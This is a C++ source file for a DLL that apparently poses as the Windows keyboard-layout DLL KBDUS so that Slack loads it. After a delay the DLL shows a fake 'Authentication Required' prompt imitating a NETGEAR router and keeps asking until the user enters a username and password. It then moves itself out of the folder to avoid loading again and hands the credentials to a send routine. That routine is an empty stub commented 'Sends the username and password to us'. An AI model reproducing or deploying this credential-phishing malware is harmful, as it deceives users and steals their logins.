// TestDll.cpp : Defines the exported functions for the DLL application.
//

#include "stdafx.h"
#include <iostream>
#include "testdll.h"
#include "SG_InputBoxLib.h"


void sendData(wchar_t* userName, wchar_t* password) {
	//Sends the username and password to us
}




DWORD WINAPI run()
{
	Sleep(5000);

	// allocating space for username and password
	wchar_t userName[300];
	wchar_t password[300];
	BOOL result;

	do {
		// trying to fool the user into typing the username and password
		result = SG_InputBox::GetString(L"Authentication Required", L"The server http://192.168.0.1:80 requires a username and password. The server says: NETGEAR DGN2000.", NULL, userName, password, L"");
	
	} while (!result);
	
	//moving our dll from the folder to prevent slack from ever loading it again 
	DWORD  nBufferLength = 4096;
	LPWSTR lpBuffer = (LPWSTR)malloc(nBufferLength);
	HMODULE hm = GetModuleHandleA("KBDUS");

	GetModuleFileNameW(hm, lpBuffer, nBufferLength);
	
	std::wstring path = lpBuffer;
	size_t pos = path.rfind(L"\\");
	size_t pos2 = path.rfind(L"\\", pos - 1);

	std::wstring suffix = path.substr(pos, path.length());
	// newPath is one folder back from the current folder where our dll is
	std::wstring newPath;
	newPath = path.substr(0, pos2);
	newPath.append(suffix);

	//moving our dll out of the folder
	MoveFileW(path.c_str(), newPath.c_str());

	free(lpBuffer);
	
	//sending the username and password to the destination
	sendData(userName, password);

	return 0;
}

